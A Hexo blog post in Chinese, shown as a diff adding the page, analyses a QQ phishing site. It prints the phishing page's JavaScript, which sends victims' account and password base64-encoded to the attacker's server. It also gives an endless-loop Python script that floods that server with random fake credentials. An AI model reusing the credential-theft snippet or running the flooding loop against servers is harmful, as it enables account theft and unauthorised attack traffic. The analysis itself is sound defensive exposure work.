@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="记一次对盗号网站的分析起因可能是群里面有人的号被盗了吧，QQ邮箱里面的群邮件里面突然收到了一封盗号邮件（这种盗号链接的风格肯定是能一眼看穿的吧😂）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次对盗号网站的分析">
+<meta property="og:url" content="http://example.com/2020/09/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%9B%97%E5%8F%B7%E7%BD%91%E7%AB%99%E7%9A%84%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Halo&#39;s Blog">
+<meta property="og:description" content="记一次对盗号网站的分析起因可能是群里面有人的号被盗了吧，QQ邮箱里面的群邮件里面突然收到了一封盗号邮件（这种盗号链接的风格肯定是能一眼看穿的吧😂）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921220637648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921220816320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921222610200.gif#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921222129832.gif#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921222404505.gif#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921231025353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921222910164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921231544916.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020092122395684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921224236794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921224900891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921230309995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921230607902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921235826822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="article:published_time" content="2020-09-21T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-11-14T07:56:10.068Z">
+<meta property="article:author" content="halozhy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200921220637648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center">
+
+<link rel="canonical" href="http://example.com/2020/09/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%9B%97%E5%8F%B7%E7%BD%91%E7%AB%99%E7%9A%84%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>记一次对盗号网站的分析 | Halo's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Halo's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-friends">
+
+    <a href="/friends/" rel="section"><i class="fas fa-user-friends fa-fw"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+
+<link rel="stylesheet" href="/dist/APlayer.min.css">
+<script type="text/javascript" src="/dist/APlayer.min.js"></script>
+<script type="text/javascript" src="/dist/music.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script> 
+<!--网易云-->   
+<meting-js
+  server="netease"
+  id="593844566"
+  type="playlist" 
+  mini="false"
+  fixed="false"
+  list-folded="true"
+  autoplay="false"
+  volume="0.4"
+  theme="#FADFA3"
+  order="list"
+  loop="all"
+  preload="auto"
+  mutex="true">
+</meting-js>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/09/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%9B%97%E5%8F%B7%E7%BD%91%E7%AB%99%E7%9A%84%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="halozhy">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Halo's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          记一次对盗号网站的分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-09-22 00:00:00" itemprop="dateCreated datePublished" datetime="2020-09-22T00:00:00+08:00">2020-09-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-14 15:56:10" itemprop="dateModified" datetime="2020-11-14T15:56:10+08:00">2020-11-14</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="记一次对盗号网站的分析"><a href="#记一次对盗号网站的分析" class="headerlink" title="记一次对盗号网站的分析"></a>记一次对盗号网站的分析</h1><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>可能是群里面有人的号被盗了吧，QQ邮箱里面的群邮件里面突然收到了一封盗号邮件（这种盗号链接的风格肯定是能一眼看穿的吧😂）</p>
+<a id="more"></a>
+
+<p><img src="https://img-blog.csdnimg.cn/20200921220637648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>链接打了个码，第一次发博客曝光，还是有点害怕</p>
+<p>点开链接，不得不承认，网页做的是真的像啊，我甚至有一股想输入账号密码的冲动<br><img src="https://img-blog.csdnimg.cn/20200921220816320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center"><br>——————————下方多GIF图预警——————————</p>
+<p>但是如果你点击“扫码快捷登录”的话，网页会提示“系统繁忙,请您使用QQ账号密码登录！”。即使是打开链接准备输入真的账号密码的安全小白，想必到这里也能看出端倪了，扫码登录这么安全的方式，怎么可能说停用就停用呢，想必TX是不会干这种事的</p>
+<p><img src="https://img-blog.csdnimg.cn/20200921222610200.gif#pic_center"></p>
+<h1 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h1><p>都0202年了，盗号网站也基本都有前端验证了，输入111111这种简单无脑的账号密码，或者是账号里面输入了字符，肯定是要被前端过滤了<br><img src="https://img-blog.csdnimg.cn/20200921222129832.gif#pic_center"><br><img src="https://img-blog.csdnimg.cn/20200921222404505.gif#pic_center"><br>好吧，那就输入一个稍微正常一点的吧，账号“88488848”，密码“pwd88488848”<br><img src="https://img-blog.csdnimg.cn/20200921231025353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>和以往的盗号网站一样，它获取账号密码成功之后就会跳转到一个正常的网站，不过此时账号密码信息应该已经被发送到盗号者的网站了<br><img src="https://img-blog.csdnimg.cn/20200921222910164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center"></p>
+<h1 id="进一步分析"><a href="#进一步分析" class="headerlink" title="进一步分析"></a>进一步分析</h1><h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p>可能是我不太喜欢直接去看源码吧，一般我会先抓包分析盗号网站的行为，而且盗号网站一般用的是未加密的http，抓出来的东西也比较容易看懂<br>使用http过滤之后，却只看到了一个get方法，没看到post，难道这个网站做出来却没有给服务器发送用户输入的账号密码？我甚至有点怀疑这是一个恶作剧盗号网站了。抱着再探究一下的态度，我开始分析前端的代码<br><img src="https://img-blog.csdnimg.cn/20200921231544916.png#pic_center"></p>
+<h2 id="前端代码分析"><a href="#前端代码分析" class="headerlink" title="前端代码分析"></a>前端代码分析</h2><p>F12来一波，定位到登录按钮的位置，看看在这个页面里面的 <code>&lt;script&gt;&lt;/script&gt;</code> 部分里面有没有直接写向后台发送数据的js脚本<br><img src="https://img-blog.csdnimg.cn/2020092122395684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20200921224236794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center"><br>看来是没有了，那就用“查看网页/框架源代码”的办法找脚本，果不其然，找到了<br><img src="https://img-blog.csdnimg.cn/20200921224900891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center"><br>201行的<code>/*新增密码校验*/</code>就写的很真实😂<br>最核心的代码就是218-220行的这些了</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">&quot;../user.php?web=&quot;</span> + <span class="keyword">new</span> <span class="built_in">Date</span>().getTime() + <span class="string">&quot;&amp;token=&quot;</span> + btoa(<span class="string">&#x27;&#123;&quot;u&quot;:&#x27;</span> + u + <span class="string">&#x27;,&quot;p&quot;:&quot;&#x27;</span> + p + <span class="string">&#x27;&quot;&#125;&#x27;</span>),<span class="function"><span class="keyword">function</span>(<span class="params">data,status</span>)</span>&#123;</span><br><span class="line">		<span class="built_in">window</span>.top.location.href = data.url;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>有趣的是，这个网页没用post方法，而是用get和传参的方式向后台传送数据，这就是为什么在抓包结果里面只能看到一个GET和HTTP 200 OK，但是看不到POST方法的原因了</p>
+<p>分析代码可以看出，<code>new Date().getTime()</code>只是获取了当前时间，而这个<code>&quot;&amp;token=&quot;</code>后面的东西应该就是重点内容了，这个命名为<code>u</code>和<code>p</code>的变量是不是很会令人联想到user和password呢，目前来看恐怕就是了，用chrome的抓包看一下吧<br><img src="https://img-blog.csdnimg.cn/20200921230309995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center"><br>token的内容是<code> eyJ1Ijo4ODQ4ODg0OCwicCI6InB3ZDg4NDg4ODQ4In0=</code>，根据这个显眼的结尾等号以及前面js脚本中<code>btoa</code>函数的使用，看了这个盗号者居然给用户的信息用base64简单的加了个密😂，解码看看内容吧<br><img src="https://img-blog.csdnimg.cn/20200921230607902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center"><br><strong>果不其然，被加密的内容就是我们刚才输入的用户名和密码！</strong></p>
+<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>至此，我们已经知道了这个盗号网站的IP地址（图中均已打码）以及它向后台传送数据的格式和方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.cn&#x2F;user.php?web&#x3D;[当前时间戳]&amp;token&#x3D;[base64加密的&#123;&quot;u&quot;:账号,&quot;p&quot;:&quot;密码&quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+<p>由于个人能力有限，目前我能做的就是用Python写点脚本给网站灌输一些垃圾数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://xxxxxx/user.php?&#x27;</span></span><br><span class="line">b=<span class="number">0</span></span><br><span class="line">j=<span class="number">1</span></span><br><span class="line">s = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> b&lt;<span class="number">1</span>:</span><br><span class="line">    t = time.time()</span><br><span class="line">    <span class="comment"># print (int(round(t * 1000))) </span></span><br><span class="line"></span><br><span class="line">    fakeId = <span class="string">&quot;&quot;</span></span><br><span class="line">    fakePwd = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):    </span><br><span class="line">        fakeId+=str(random.randint(<span class="number">0</span>,<span class="number">9</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">        fakePwd += s[random.randint(<span class="number">0</span>,len(s)<span class="number">-1</span>)]</span><br><span class="line">    print(<span class="string">&quot;FakeId &quot;</span>+fakeId)</span><br><span class="line">    print(<span class="string">&quot;FakePwd &quot;</span>+fakePwd)</span><br><span class="line"></span><br><span class="line">    up = <span class="string">&quot;&#123;\&quot;u\&quot;:&quot;</span>+fakeId+<span class="string">&quot;,\&quot;p\&quot;:\&quot;&quot;</span>+fakePwd+<span class="string">&quot;\&quot;&#125;&quot;</span></span><br><span class="line">    bytes_up = up.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    userData = base64.b64encode(bytes_up)</span><br><span class="line">    userData = userData.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;userDataB64 &quot;</span>+userData)</span><br><span class="line"></span><br><span class="line">    newUrl=url+<span class="string">&quot;web=&quot;</span>+str(round(t * <span class="number">1000</span>))+<span class="string">&quot;&amp;token=&quot;</span>+userData</span><br><span class="line">    response=requests.get(newUrl)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;次数：&#x27;</span>+str(j)+<span class="string">&#x27; &#x27;</span>+newUrl+<span class="string">&#x27; &#x27;</span>+str(response))</span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;!RUN FINISHED!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>运行截图</p>
+<p><img src="https://img-blog.csdnimg.cn/20200921235826822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhbG96aHk=,size_16,color_FFFFFF,t_70#pic_center"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2020/12/05/%E7%9B%AE%E5%89%8D%E5%9C%A8%E6%9F%90MOOC%E7%BD%91%E7%AB%99%E5%AE%9E%E7%8E%B0%E5%8D%8A%E8%87%AA%E5%8A%A8%E4%BA%92%E8%AF%84%E7%9A%84%E6%8E%A2%E8%AE%A8/" rel="next" title="对于目前在某MOOC网站实现半自动互评的探讨">
+      对于目前在某MOOC网站实现半自动互评的探讨 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%9B%97%E5%8F%B7%E7%BD%91%E7%AB%99%E7%9A%84%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">记一次对盗号网站的分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%B7%E5%9B%A0"><span class="nav-number">2.</span> <span class="nav-text">起因</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9D%E6%AD%A5%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">初步分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">进一步分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90"><span class="nav-number">4.1.</span> <span class="nav-text">抓包分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">4.2.</span> <span class="nav-text">前端代码分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E6%9E%9C"><span class="nav-number">5.</span> <span class="nav-text">结果</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">halozhy</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+  
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">halozhy</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
